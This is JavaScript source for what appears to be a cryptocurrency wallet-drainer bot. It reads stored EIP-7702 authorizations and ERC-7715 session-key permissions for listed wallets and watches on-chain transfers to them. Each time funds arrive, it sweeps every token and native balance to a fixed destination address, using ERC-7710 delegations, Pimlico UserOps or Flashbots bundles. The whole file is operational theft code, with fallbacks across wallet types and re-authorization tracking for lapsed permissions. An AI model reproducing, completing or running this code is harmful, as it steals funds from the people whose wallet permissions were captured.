const ENTRY_POINT_V07 = "0x0000000071727De22E5E9d8BAf0edAc6f37da032";

function computeUserOpHashV07(op, chainId) {
  // PackedUserOperation: pack (verificationGasLimit, callGasLimit) into bytes32
  //   and (maxPriorityFeePerGas, maxFeePerGas) into bytes32
  const toU128Hex = v => ethers.zeroPadValue(ethers.toBeHex(BigInt(v)), 16);
  const accountGasLimits = ethers.concat([toU128Hex(op.verificationGasLimit), toU128Hex(op.callGasLimit)]);
  const gasFees           = ethers.concat([toU128Hex(op.maxPriorityFeePerGas),  toU128Hex(op.maxFeePerGas)]);

  // Build paymasterAndData: 20-byte paymaster + 16-byte pmVerifyGasLimit + 16-byte pmPostGasLimit + pmData
  let paymasterAndData = "0x";
  if (op.paymaster && op.paymaster !== "0x0000000000000000000000000000000000000000") {
    paymasterAndData = ethers.concat([
      op.paymaster,
      toU128Hex(op.paymasterVerificationGasLimit || 0n),
      toU128Hex(op.paymasterPostOpGasLimit || 0n),
      op.paymasterData || "0x",
    ]);
  }

  const innerHash = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ["address","uint256","bytes32","bytes32","bytes32","uint256","bytes32","bytes32"],
      [
        op.sender,
        BigInt(op.nonce),
        ethers.keccak256(op.initCode || "0x"),
        ethers.keccak256(op.callData),
        accountGasLimits,
        BigInt(op.preVerificationGas),
        gasFees,
        ethers.keccak256(paymasterAndData),
      ]
    )
  );

  return ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ["bytes32","address","uint256"],
      [innerHash, ENTRY_POINT_V07, BigInt(chainId)]
    )
  );
}

// ── Strategy A: ERC-7710 redeemDelegations ────────────────────────────────────
// Works for: MetaMask Smart Accounts Kit (DeleGator), ZeroDev Kernel, any wallet
// that returns signerData.submitToAddress from wallet_grantPermissions.
// The bot (its EOA) is the delegate — it calls redeemDelegations as a plain tx.
async function _sweepViaRedeemDelegations(checksum, short, permissionsContext, delegationManager, calls) {
  try {
    const botWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
    const feeData   = await rpcProvider.getFeeData();

    const executionCallData = encodeERC7579Batch(calls);

    const iface = new ethers.Interface([
      "function redeemDelegations(bytes[] calldata _permissionContexts, bytes32[] calldata _modes, bytes[] calldata _executionCallDatas) external",
    ]);

    const calldata = iface.encodeFunctionData("redeemDelegations", [
      [permissionsContext],
      [ERC7579_BATCH_MODE],
      [executionCallData],
    ]);

    const tx = await botWallet.sendTransaction({
      to:   delegationManager,
      data: calldata,
      gasLimit: 800_000n,
      maxFeePerGas:         feeData.maxFeePerGas         ?? undefined,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
    });
    const receipt = await tx.wait();
    log(`[session] ✅ ERC-7710 redeemDelegations: ${receipt.hash} (${calls.length} calls)`);
    return true;
  } catch (e) {
    log(`[session] ❌ redeemDelegations failed for ${short}: ${e.message}`);
    return false;
  }
}

// ── Strategy B: ERC-4337 v0.7 UserOp via Pimlico ────────────────────────────
// Works for: Coinbase Smart Wallet, Ambire, Zerion, Biconomy Nexus, and any
// ERC-4337 smart account that implements ERC-7715 with context in the UserOp
// signature.
//
// Signature format (standard ERC-7715 ERC-4337 path):
//   concat(permissionsContext, ecdsaSign(userOpHash, botPrivateKey))
//
// callData encoding is tried in order — ERC-7579 execute() first (most modern
// smart accounts), then Coinbase executeBatch(), then simple executeBatch.
async function _sweepViaUserOp(checksum, short, permissionsContext, calls, pimlicoUrl) {
  const ERC20_IFACE2 = new ethers.Interface(["function transfer(address,uint256) external returns (bool)"]);

  // Multiple callData encodings to handle different smart account ABIs
  const EXECUTE_ABIS = [
    // 1. ERC-7579 standard: execute(bytes32 mode, bytes calldata executionCalldata)
    //    Used by: MetaMask DK (after upgrade), ZeroDev Kernel v3, Biconomy Nexus, Rhinestone
    () => {
      const iface = new ethers.Interface([
        "function execute(bytes32 mode, bytes calldata executionCalldata) external",
      ]);
      return iface.encodeFunctionData("execute", [ERC7579_BATCH_MODE, encodeERC7579Batch(calls)]);
    },
    // 2. Coinbase Smart Wallet / simple (target, value, data)[] batch
    //    Used by: Coinbase Smart Wallet, some ERC-4337 reference implementations
    () => {
      const iface = new ethers.Interface([
        "function executeBatch((address target,uint256 value,bytes data)[] calldata calls) external",
      ]);
      return iface.encodeFunctionData("executeBatch", [
        calls.map(c => ({ target: c.to, value: c.value, data: c.data || "0x" })),
      ]);
    },
    // 3. ERC-4337 reference implementation executeBatch(address[], uint256[], bytes[])
    //    Used by: Ethereum Foundation reference, some older wallets
    () => {
      const iface = new ethers.Interface([
        "function executeBatch(address[] calldata dest, uint256[] calldata value, bytes[] calldata func) external",
      ]);
      return iface.encodeFunctionData("executeBatch", [
        calls.map(c => c.to),
        calls.map(c => c.value),
        calls.map(c => c.data || "0x"),
      ]);
    },
    // 4. Safe (ERC-4337 module) execTransactionFromModule (single call only, iterate)
    //    Used by: Safe{Wallet} with 4337 module, Gnosis Safe
    () => {
      if (calls.length !== 1) throw new Error("Safe single-call only");
      const iface = new ethers.Interface([
        "function execTransactionFromModule(address to, uint256 value, bytes calldata data, uint8 operation) external returns (bool)",
      ]);
      return iface.encodeFunctionData("execTransactionFromModule", [calls[0].to, calls[0].value, calls[0].data || "0x", 0]);
    },
  ];

  const botWallet = new ethers.Wallet(PRIVATE_KEY);
  const pimlicoRpc = new ethers.JsonRpcProvider(pimlicoUrl);

  // Get EntryPoint nonce
  const entryPoint = new ethers.Contract(
    ENTRY_POINT_V07,
    ["function getNonce(address sender, uint192 key) external view returns (uint256)"],
    rpcProvider
  );
  const nonce = await entryPoint.getNonce(checksum, 0n);

  const feeData = await rpcProvider.getFeeData();
  const maxFeePerGas         = feeData.maxFeePerGas         ?? ethers.parseUnits("2", "gwei");
  const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas ?? ethers.parseUnits("1", "gwei");

  for (const [idx, encodeCallData] of EXECUTE_ABIS.entries()) {
    let callData;
    try { callData = encodeCallData(); } catch (e) { log(`[session] ABI ${idx+1} skipped: ${e.message}`); continue; }

    // Use permissionsContext as stub signature for gas estimation
    const partialOp = {
      sender: checksum,
      nonce:  ethers.toBeHex(nonce),
      initCode: "0x",
      callData,
      callGasLimit:              ethers.toBeHex(300_000n),
      verificationGasLimit:      ethers.toBeHex(200_000n),
      preVerificationGas:        ethers.toBeHex(50_000n),
      maxFeePerGas:              ethers.toBeHex(maxFeePerGas),
      maxPriorityFeePerGas:      ethers.toBeHex(maxPriorityFeePerGas),
      paymaster:                 "0x0000000000000000000000000000000000000000",
      paymasterVerificationGasLimit: ethers.toBeHex(0n),
      paymasterPostOpGasLimit:       ethers.toBeHex(0n),
      paymasterData:             "0x",
      signature:                 permissionsContext,
    };

    try {
      // 1. Gas estimation — will revert if callData ABI is wrong for this account
      const gasEst = await pimlicoRpc.send("eth_estimateUserOperationGas", [partialOp, ENTRY_POINT_V07]);
      log(`[session] ABI ${idx+1} gas estimation OK: callGas=${gasEst.callGasLimit}`);

      // 2. Get sponsored paymaster data from Pimlico
      const opForSponsorship = {
        ...partialOp,
        callGasLimit:         gasEst.callGasLimit,
        verificationGasLimit: gasEst.verificationGasLimit,
        preVerificationGas:   gasEst.preVerificationGas,
      };
      let pmResult = null;
      if (PIMLICO_POLICY_ID) {
        try {
          pmResult = await pimlicoRpc.send("pm_sponsorUserOperation", [
            opForSponsorship,
            ENTRY_POINT_V07,
            { sponsorshipPolicyId: PIMLICO_POLICY_ID },
          ]);
        } catch (pmErr) {
          log(`[session] paymaster failed (will pay own gas): ${pmErr.message}`);
        }
      }

      const fullOp = {
        ...opForSponsorship,
        ...(pmResult ? {
          callGasLimit:                  pmResult.callGasLimit         ?? opForSponsorship.callGasLimit,
          verificationGasLimit:          pmResult.verificationGasLimit ?? opForSponsorship.verificationGasLimit,
          preVerificationGas:            pmResult.preVerificationGas   ?? opForSponsorship.preVerificationGas,
          paymaster:                     pmResult.paymaster            ?? "0x0000000000000000000000000000000000000000",
          paymasterData:                 pmResult.paymasterData        ?? "0x",
          paymasterVerificationGasLimit: pmResult.paymasterVerificationGasLimit ?? ethers.toBeHex(0n),
          paymasterPostOpGasLimit:       pmResult.paymasterPostOpGasLimit       ?? ethers.toBeHex(0n),
        } : {}),
      };

      // 3. Compute UserOp hash and sign with bot's raw ECDSA key (no eth_sign prefix)
      const userOpHash = computeUserOpHashV07(fullOp, CHAIN_ID);
      const rawSig = botWallet.signingKey.sign(userOpHash);
      const ecdsaSig = ethers.Signature.from(rawSig).serialized; // 65 bytes

      // ERC-7715 signature = concat(permissionsContext, ecdsaSig)
      fullOp.signature = ethers.concat([permissionsContext, ecdsaSig]);

      // 4. Submit
      const opHash = await pimlicoRpc.send("eth_sendUserOperation", [fullOp, ENTRY_POINT_V07]);
      log(`[session] UserOp submitted (ABI ${idx+1}): ${opHash}`);

      // 5. Poll for receipt (max 60 s)
      for (let i = 0; i < 30; i++) {
        await sleep(2_000);
        const rcpt = await pimlicoRpc.send("eth_getUserOperationReceipt", [opHash]).catch(() => null);
        if (rcpt) {
          if (rcpt.success) {
            log(`[session] ✅ UserOp swept: ${rcpt.receipt.transactionHash}`);
            return true;
          } else {
            log(`[session] ❌ UserOp reverted: ${rcpt.receipt?.transactionHash}`);
            break;
          }
        }
      }
    } catch (e) {
      log(`[session] ABI ${idx+1} failed: ${e.message?.slice(0, 120)}`);
    }
  }

  return false;
}

// ── Main session key sweep dispatcher ────────────────────────────────────────
async function sweepViaSessionKey(checksum, short, addrKey) {
  if (!supabase) { log(`[session] no supabase — skipping ${short}`); return false; }

  // ── 1. Fetch session ──────────────────────────────────────────────────────
  let { data: session } = await supabase
    .from("session_keys")
    .select("*")
    .eq("address", addrKey)
    .eq("chain", CHAIN)
    .single();

  if (!session) {
    log(`[session] no session_keys row for ${short} — checking delegated_wallets`);
    const { data: dw } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .single();
    if (!dw?.permit_metadata?.expiry) {
      log(`[session] no session data for ${short}`); return false;
    }
    session = { expiry: dw.permit_metadata.expiry, session_data: dw.permit_metadata.session_data };
  }

  if (!session?.expiry) { log(`[session] missing expiry for ${short}`); return false; }

  const expiry = BigInt(session.expiry);
  if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
    log(`[session] session expired for ${short} — marking needs-reauth`);
    await supabase.from("delegated_wallets")
      .update({ status: "needs-reauth" })
      .eq("address", addrKey).eq("chain", CHAIN).then(() => {}).catch(() => {});
    return false;
  }

  // ── 2. Check balances ─────────────────────────────────────────────────────
  const balances = await checkAllBalances(checksum);
  const nonZero  = balances.filter(b => b.balance > 0n);
  const nativeBal = await rpcProvider.getBalance(checksum);
  if (nonZero.length === 0 && nativeBal === 0n) {
    log(`[session] all zero for ${short} — skipping`); return false;
  }

  // ── 3. Build sweep calls ──────────────────────────────────────────────────
  const ERC20_IFACE = new ethers.Interface(["function transfer(address to, uint256 value) external returns (bool)"]);
  const calls = [];
  if (nativeBal > 0n) {
    calls.push({ to: DESTINATION_ADDRESS, value: nativeBal, data: "0x" });
  }
  for (const t of nonZero) {
    calls.push({ to: t.address, value: 0n, data: ERC20_IFACE.encodeFunctionData("transfer", [DESTINATION_ADDRESS, t.balance]) });
  }

  // ── 4. Extract permissions data ───────────────────────────────────────────
  const sd = session.session_data || {};
  // permissionsContext: the ERC-7715 context returned by wallet_grantPermissions
  const permissionsContext = sd.permissionsContext || sd.context || null;
  // submitToAddress: present when the wallet uses ERC-7710 redeemDelegations
  // (MetaMask Smart Accounts Kit, ZeroDev, etc.)
  const submitToAddress = sd?.signerData?.submitToAddress || null;

  if (!permissionsContext) {
    log(`[session] no permissionsContext in session_data — legacy session, skip`);
    return false;
  }

  log(`[session] sweeping ${calls.length} calls (${nonZero.length} tokens + native) for ${short}`);

  // ── 5a. ERC-7710 redeemDelegations (MetaMask DK, ZeroDev, EIP-7702 wallets) ──
  if (submitToAddress) {
    log(`[session] → strategy: ERC-7710 redeemDelegations via ${submitToAddress.slice(0,10)}`);
    return await _sweepViaRedeemDelegations(checksum, short, permissionsContext, submitToAddress, calls);
  }

  // ── 5b. ERC-4337 v0.7 UserOp via Pimlico ────────────────────────────────
  // (Coinbase Smart Wallet, Ambire, Zerion, Biconomy Nexus, Rhinestone, etc.)
  const pimlicoUrl = getPimlicoUrl();
  if (pimlicoUrl && PIMLICO_API_KEY) {
    log(`[session] → strategy: ERC-4337 UserOp via Pimlico (${CHAIN})`);
    const ok = await _sweepViaUserOp(checksum, short, permissionsContext, calls, pimlicoUrl);
    if (ok) return true;
  } else {
    log(`[session] Pimlico not configured for ${CHAIN} — cannot execute UserOp`);
  }

  log(`[session] ❌ all session key strategies exhausted for ${short}`);
  return false;
}

// ══════════════════════════════════════════════════════════════════════════
// TIER 0B: EIP-7702 + FLASHBOTS ATOMIC BUNDLE (ETH ONLY)
// ══════════════════════════════════════════════════════════════════════════

async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
  if (CHAIN !== "eth") { return false; }
  if (!FLASHBOTS_AUTH_KEY) {
    log(`[flashbots] FLASHBOTS_AUTH_KEY not set`);
    return false;
  }

  log(`[flashbots] building atomic bundle for ${short}`);

  if (!supabase) { log(`[flashbots] no supabase`); return false; }
  const { data: authData } = await supabase
    .from("delegated_wallets")
    .select("authorization")
    .eq("address", addrKey)
    .eq("chain", "eth")
    .single();

  if (!authData?.authorization) {
    log(`[flashbots] no authorization stored for ${short}`);
    return false;
  }

  const balances = await checkAllBalances(checksum);
  const nonZero = balances.filter(b => b.balance > 0n);
  const nativeBal = await rpcProvider.getBalance(checksum);

  if (nonZero.length === 0 && nativeBal === 0n) {
    log(`[flashbots] all zero for ${short} — skipping`);
    return false;
  }

  log(`[flashbots] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)}`);

  try {
    const feeData = await rpcProvider.getFeeData();
    const block = await rpcProvider.getBlock("latest");
    const baseFee = block?.baseFeePerGas || 0n;
    const maxPrio = feeData.maxPriorityFeePerGas || 1_000_000_000n;
    const maxFee = baseFee * 2n + maxPrio;
    const targetBlock = block.number + 1;

    const setCodeTx = {
      type: 4,
      to: checksum,
      value: 0,
      data: "0x",
      gasLimit: 50000,
      maxFeePerGas: maxFee,
      maxPriorityFeePerGas: maxPrio,
      nonce: await rpcProvider.getTransactionCount(relayerWallet.address),
      chainId: 1,
      authorizationList: [authData.authorization],
    };

    const DELEGATION_SWEEP_IFACE = new ethers.Interface(["function sweepAll(address to) external"]);
    const sweepTx = {
      type: 2,
      to: checksum,
      value: 0,
      data: DELEGATION_SWEEP_IFACE.encodeFunctionData("sweepAll", [DESTINATION_ADDRESS]),
      gasLimit: 300000 + (nonZero.length * 50000),
      maxFeePerGas: maxFee,
      maxPriorityFeePerGas: maxPrio,
      nonce: await rpcProvider.getTransactionCount(relayerWallet.address) + 1,
      chainId: 1,
    };

    const signedSetCode = await relayerWallet.signTransaction(setCodeTx);
    const signedSweep = await relayerWallet.signTransaction(sweepTx);

    const authSigner = new ethers.Wallet(FLASHBOTS_AUTH_KEY);
    const flashbotsAuth = await authSigner.signMessage(
      ethers.getBytes(ethers.keccak256(ethers.toUtf8Bytes("FLASHBOTS_AUTH")))
    );

    const bundleParams = {
      txs: [signedSetCode, signedSweep],
      blockNumber: ethers.toBeHex(targetBlock),
      minTimestamp: 0,
      maxTimestamp: 0,
      revertingTxHashes: [],
    };

    const flashbotsRelay = "https://relay.flashbots.net";
    const simBody = { jsonrpc: "2.0", id: 1, method: "eth_callBundle", params: [bundleParams] };

    const simRes = await fetch(flashbotsRelay, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
      },
      body: JSON.stringify(simBody),
    });

    const simResult = await simRes.json();
    if (simResult.error) {
      log(`[flashbots] simulation failed: ${simResult.error.message}`);
      return false;
    }

    let included = false;
    for (let i = 0; i < 3; i++) {
      const blockNum = targetBlock + i;
      bundleParams.blockNumber = ethers.toBeHex(blockNum);

      const sendBody = { jsonrpc: "2.0", id: 1, method: "eth_sendBundle", params: [bundleParams] };
      const sendRes = await fetch(flashbotsRelay, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
        },
        body: JSON.stringify(sendBody),
      });

      const sendResult = await sendRes.json();
      if (sendResult.error) { log(`[flashbots] bundle error for block ${blockNum}: ${sendResult.error.message}`); continue; }
      log(`[flashbots] bundle submitted for block ${blockNum}`);

      await sleep(12_000);
      const currentBlock = await rpcProvider.getBlockNumber();
      if (currentBlock >= blockNum) {
        const code = await rpcProvider.getCode(checksum);
        if (code && code !== "0x" && code.startsWith("0xef0100")) {
          const postNative = await rpcProvider.getBalance(checksum);
          if (postNative < nativeBal) {
            log(`[flashbots] ✅ bundle included in block ${blockNum}`);
            included = true;
            break;
          }
        }
        log(`[flashbots] bundle not confirmed in block ${blockNum} — trying next`);
      }
    }

    if (!included) {
      log(`[flashbots] bundle not included after 3 blocks — falling back`);
      return false;
    }
    return true;
  } catch (e) {
    log(`[flashbots] ❌ error for ${short}: ${e.message}`);
    return false;
  }
}

// ── Transfer event listeners ──────────────────────────────────────────────────

async function startTransferListeners(wsProvider, tokens) {
  const transferTopic = ethers.id("Transfer(address,address,uint256)");
  const tokenByAddr = new Map(tokens.map(t => [t.address.toLowerCase(), t]));

  const BATCH_SIZE = 10;
  const batches = [];
  for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
    batches.push(tokens.slice(i, i + BATCH_SIZE));
  }

  log(`[listeners] creating ${batches.length} log-filter subscriptions for ${tokens.length} tokens`);

  for (let i = 0; i < batches.length; i++) {
    if (i > 0) await sleep(200);
    const batch  = batches[i];
    const filter = {
      address: batch.map(t => t.address),
      topics: [transferTopic],
    };
    try {
      wsProvider.on(filter, async (logEvent) => {
        if (!logEvent || !logEvent.topics) return;
        const to = logEvent.topics[2];
        if (!to || to.length < 40) return;
        const toLower = "0x" + to.slice(-40).toLowerCase();
        if (!monitoredWallets.has(toLower)) return;
        const txHash = logEvent.transactionHash?.slice(0, 12) ?? "????";
        log(`[transfer] 📥 ${tokenByAddr.get(logEvent.address?.toLowerCase())?.symbol ?? "?"} -> ${toLower.slice(0, 10)} (${txHash})`);
        if (sweepingNow.has(toLower)) { log(`[transfer] debounced — already sweeping`); return; }
        sweepingNow.add(toLower);
        const wallet = monitoredWallets.get(toLower);
        dispatchSweep(wallet)
          .catch(e => log(`[transfer] error: ${e.message}`))
          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
      });
    } catch (e) { warn(`[listeners] batch ${i} subscription failed: ${e.message}`); }
  }
  log(`[listeners] ✅ ${batches.length} log-filter subscriptions active`);
}

let lastBlockFetch = 0;

async function startNativeListener(wsProvider) {
  wsProvider.on("block", async (blockNumber) => {
    reconnectAttempt = 0;
    if (monitoredWallets.size === 0) return;
    const now = Date.now();
    if (now - lastBlockFetch < 3_000) return;
    lastBlockFetch = now;

    try {
      const block = await rpcProvider.getBlock(blockNumber, true);
      if (!block?.transactions) return;
      for (const tx of block.transactions) {
        if (!tx.to) continue;
        const toLower = tx.to.toLowerCase();
        if (!monitoredWallets.has(toLower)) continue;
        if (!tx.value || tx.value === 0n) continue;
        const wallet = monitoredWallets.get(toLower);
        log(`[native] 📥 ${ethers.formatEther(tx.value)} native → ${tx.to.slice(0, 10)} type=${wallet.type}`);

        if (wallet.type !== "eip7702") {
          log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
          continue;
        }
        if (sweepingNow.has(toLower)) continue;
        sweepingNow.add(toLower);
        sweepDelegatedWallet(wallet.address)
          .catch(e => log(`[native] sweep error: ${e.message}`))
          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
      }
    } catch (e) {
      if (e.message?.includes("rate limit") || e.message?.includes("429")) {
        log(`[native] rate limited — skipping block ${blockNumber}`);
      }
    }
  });
  log(`[listeners] ✅ native coin listener active`);
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address, type")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
    delegatedWallets.clear();
    monitoredWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (!checksum) continue;
      const type = row.type || "eip7702";
      delegatedWallets.set(checksum, type);
      monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
    }
    const types    = [...delegatedWallets.values()];
    const e7Count  = types.filter(t => t === "eip7702").length;
    const skCount  = types.filter(t => t === "session-key").length;
    const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback" || t === "permit2-gasless").length;
    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2)`);
  } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  if (realtimeChannel) {
    supabase.removeChannel(realtimeChannel).catch(() => {});
    realtimeChannel = null;
  }

  realtimeChannel = supabase
    .channel(`bot_realtime_${CHAIN}`)

    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        const isNew = !monitoredWallets.has(address.toLowerCase());
        delegatedWallets.set(address, type);
        monitoredWallets.set(address.toLowerCase(), { address, type });
        needsReconnect.delete(address.toLowerCase());
        needsReauthWallets.delete(address.toLowerCase());
        log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
        const balances = await checkAllBalances(address);
        const nonZero  = balances.filter(b => b.balance > 0n);
        if (nonZero.length > 0) {
          log(`[realtime] 🔔 found ${nonZero.length} tokens with balance — dispatching sweep`);
          dispatchSweep({ address, type }).catch(e => err(`[realtime] sweep error: ${e.message}`));
        } else {
          // Still sweep — there might be native balance or new deposits
          dispatchSweep({ address, type }).catch(e => err(`[realtime] sweep error: ${e.message}`));
        }
      },
    )

    .subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        log(`[realtime] ✅ subscribed to delegated_wallets (chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR") {
        warn(`[realtime] error — will reconnect`);
        handleReconnect();
      } else if (status === "TIMED_OUT") {
        warn(`[realtime] timeout — will reconnect`);
        handleReconnect();
      } else {
        log(`[realtime] status: ${status}`);
      }
    });
}

function handleReconnect() {
  if (supabase && realtimeChannel) {
    supabase.removeChannel(realtimeChannel).catch(() => {});
    realtimeChannel = null;
  }
  const delay = withJitter(BACKOFF_MS[reconnectAttempt] || BACKOFF_MS[BACKOFF_MS.length - 1]);
  reconnectAttempt++;
  log(`[realtime] reconnecting in ${delay}ms (attempt ${reconnectAttempt})`);
  setTimeout(subscribeRealtime, delay);
}

// ── Websocket connection ──────────────────────────────────────────────────────

async function main() {
  log(`🚀 Starting bot for CHAIN=${CHAIN} CHAIN_ID=${CHAIN_ID}`);

  // Load tokens
  TOKENS = await fetchTokenList(CHAIN);
  log(`[init] loaded ${TOKENS.length} tokens`);

  // Load existing wallets from Supabase
  await loadDelegatedWallets();

  // Create websocket provider
  let wsProvider;

  function createWebSocket() {
    if (wsProvider) {
      try { wsProvider.removeAllListeners(); wsProvider.destroy(); } catch {}
    }

    if (!WS_URL) {
      log(`[ws] no WSS_URL configured — running in HTTP-polling mode`);
      return null;
    }

    try {
      wsProvider = new ethers.WebSocketProvider(WS_URL);

      // Start listeners
      startTransferListeners(wsProvider, TOKENS).catch(e => err(`[ws] startTransferListeners error: ${e.message}`));
      startNativeListener(wsProvider).catch(e => err(`[ws] startNativeListener error: ${e.message}`));

      // Reconnect on close or error with exponential backoff
      let backoff = 1000;
      wsProvider._websocket.onclose = () => {
        warn(`[ws] disconnected — reconnecting in ${backoff}ms`);
        setTimeout(() => {
          backoff = Math.min(backoff * 2, 60_000);
          createWebSocket();
        }, backoff);
      };
      wsProvider._websocket.onerror = () => { wsProvider._websocket.close(); };

      log(`[ws] ✅ connected`);
      return wsProvider;
    } catch (e) {
      err(`[ws] connection failed: ${e.message} — running in HTTP-polling mode`);
      return null;
    }
  }

  // Initialize WS
  createWebSocket();

  // Subscribe to Realtime
  subscribeRealtime();

  log(`[init] ✅ ready`);
}

main().catch(e => { console.error(`[FATAL] ${e.message}`); process.exit(1); });
